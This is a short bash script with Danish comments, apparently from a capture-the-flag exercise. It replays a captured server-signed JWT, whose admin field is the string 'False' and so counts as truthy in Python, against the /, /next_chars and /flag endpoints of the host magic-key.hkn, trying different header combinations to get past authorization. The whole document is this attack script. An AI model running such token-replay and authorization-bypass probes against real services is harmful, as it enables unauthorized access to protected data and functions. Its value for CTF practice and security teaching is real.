#!/bin/bash
# Den AEGTE server-signerede JWT fra frame 15083 (admin:"False" som STRENG - Python truthy-bug)
JWT_REAL="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6IkZhbHNlIiwidGltZXN0YW1wIjoiMTcwMTQ0NTIyNSJ9.ii2mBDI5IB0iTl31wud_UDqzUkch0ui8WVW0yHG00hg"
STOKEN="very-good-session-token"

echo "### Kun den nye rigtige JWT (admin:\"False\" streng) ###"
for path in "/" "/next_chars" "/flag"; do
  echo "=== GET $path med kun JWT_REAL ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "JWT: $JWT_REAL"
  echo ""
  echo "---"
done

echo ""
echo "### JWT_REAL + Session-Token sammen ###"
for path in "/" "/next_chars" "/flag"; do
  echo "=== GET $path med JWT_REAL + Session-Token ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "JWT: $JWT_REAL" \
    -H "Session-Token: $STOKEN"
  echo ""
  echo "---"
done

echo ""
echo "### Samme men med header 'Authorization: Bearer' i stedet for 'JWT:' ###"
for path in "/" "/next_chars" "/flag"; do
  echo "=== GET $path med Authorization: Bearer JWT_REAL ==="
  curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn${path}" \
    -H "Authorization: Bearer $JWT_REAL" \
    -H "Session-Token: $STOKEN"
  echo ""
  echo "---"
done
